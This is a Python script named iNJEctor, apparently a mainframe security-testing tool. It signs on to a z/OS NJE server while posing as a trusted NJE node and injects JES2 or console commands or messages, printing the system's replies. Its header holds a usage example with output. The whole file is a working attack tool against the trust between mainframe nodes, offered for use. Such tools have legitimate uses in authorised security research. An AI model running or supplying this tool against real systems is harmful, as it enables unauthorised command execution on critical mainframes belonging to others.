#!/usr/bin/python

## NJE NMR Command Sender
## Allows for sending commands to z/OS NJE
## requires OHOST and RHOST

#
#    This program is free software: you can redistribute it and/or modify
#    it under the terms of the GNU General Public License as published by
#    the Free Software Foundation, either version 3 of the License, or
#    (at your option) any later version.
#
#    This program is distributed in the hope that it will be useful,
#    but WITHOUT ANY WARRANTY; without even the implied warranty of
#    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
#    GNU General Public License for more details.
#
#    You should have received a copy of the GNU General Public License
#    along with this program.  If not, see <http://www.gnu.org/licenses/>.
#
#########
#
# This program uses the NJE python library to sent command messages between NJE nodes
# example:
# $ ./iNJEctor.py 10.10.0.200 WASHDC NEWYORK "\$D NODE" --pass 'security' -d
# output:
# 12.21.15          $HASP826 NODE(1)
# 12.21.15          $HASP826 NODE(1)  NAME=NEWYORK,STATUS=(OWNNODE),TRANSMIT=BOTH,
# 12.21.15          $HASP826          RECEIVE=BOTH,HOLD=NONE
# 12.21.15          $HASP826 NODE(2)
# 12.21.15          $HASP826 NODE(2)  NAME=WASHDC,STATUS=(VIA/LNE1),TRANSMIT=BOTH,
# 12.21.15          $HASP826          RECEIVE=BOTH,HOLD=NONE
#

import njelib
import argparse
import sys
import signal

class c:
    BLUE = '\033[94m'
    DARKBLUE = '\033[0;34m'
    PURPLE = '\033[95m'
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    RED = '\033[91m'
    WHITE = '\033[1;37m'
    ENDC = '\033[0m'
    DARKGREY = '\033[1;30m'


    def disable(self):
        self.BLUE = ''
        self.GREEN = ''
        self.YELLOW = ''
        self.DARKBLUE = ''
        self.PURPLE = ''
        self.WHITE= ''
        self.RED = ''
        self.ENDC = ''

def signal_handler(signal, frame):
        print (c.ENDC+ "\n( PACMAN Death Sound )\n")
        sys.exit(0)
signal.signal(signal.SIGINT, signal_handler)

#start argument parser
parser = argparse.ArgumentParser(description='iNJEctor takes a target host, target NJE hostname and your own NJE hostname and send JES2 commands to the target. Displays the output to stdout.\n See: http://www-01.ibm.com/support/knowledgecenter/SSLTBW_2.1.0/com.ibm.zos.v2r1.hasa200/has2cmdr.htm for a list of commands.')
parser.add_argument('target',help='The z/OS Mainframe NJE Server IP or Hostname')
parser.add_argument('ohost',help='Name of the host you\'re sending the control record as. Note that both ohost and rhost must be valid.')
parser.add_argument('rhost',help='Name of the host you expect to send the command to. Note that both ohost and rhost must be valid.')
parser.add_argument('command',help='JES2 or console command or message you wish to send. ')
parser.add_argument('-p','--port',help='The NJE server port. Default is 175', dest='port', default=175, type=int)
parser.add_argument('-m','--message',help='Send as message instead of command.',dest='msg',default=False,action='store_true')
parser.add_argument('--pass', help='Use this flag to provide a password for sigon', dest='password', default='')
parser.add_argument('-u','--user', help='User to send message to (instead of default console)', dest='user', default='')
parser.add_argument('-d','--debug',help='Show debug information. Displays A LOT of information',default=False,dest='debug',action='store_true')
parser.add_argument('-q','--quiet',help='Do not display the logo',default=False,dest='quiet',action='store_true')
args = parser.parse_args()

if not args.quiet:
    print (c.GREEN+'''        _ '''+c.RED+'''  _   __      __  ______'''+c.GREEN+'''      __
       (_)'''+c.RED+''' / | / /     / / / ____/'''+c.GREEN+''' ____/ / ____  _____
      / / '''+c.RED+'''/  |/ / _   / / / __/  '''+c.GREEN+'''/ ___/ __/ __ \/ ___/
     / / '''+c.RED+'''/ /|  / / /_/ / / /___ '''+c.GREEN+'''/ /__/ /_/ /_/ / /
    /_/ '''+c.RED+'''/_/ |_/  \____/ /_____/ '''+c.GREEN+'''\___/\__/\____/_/
         The JES2 NJE Command Injector\n ''' + c.ENDC)


nje = njelib.NJE(args.ohost,args.rhost)

if not args.quiet: print ('[+] Signing on to', args.target,":", args.port)

if args.debug:
    nje.set_debuglevel(1)

t = nje.session(host=args.target,port=args.port, timeout=2, password=args.password)

if t:
    if not args.quiet: print ('[+] Signon to', nje.host ,'Complete')
else:
    print ('[!] Signon to', nje.host ,'Failed!\n    Enable debugging to see why.')
    sys.exit(-1)

if not args.msg:
    if not args.debug and not args.quiet: print ("[+] Sending Command:", args.command)
    nmr = nje.sendCommand(args.command)
    if not args.quiet: print ("[+] Reply Received:")
    print ("\n", nmr)
else:
    if not args.debug and not args.quiet:
        if args.user:
            print ("[+] Sending Message (",args.command,") to user: ", args.user)
        else:
            print ("[+] Sending Message:", args.command)
    if len(args.user) > 0:
        nje.sendMessage(args.command, args.user)
    else:
        nje.sendMessage(args.command)
    if not args.debug: print ("[+] Message sent")
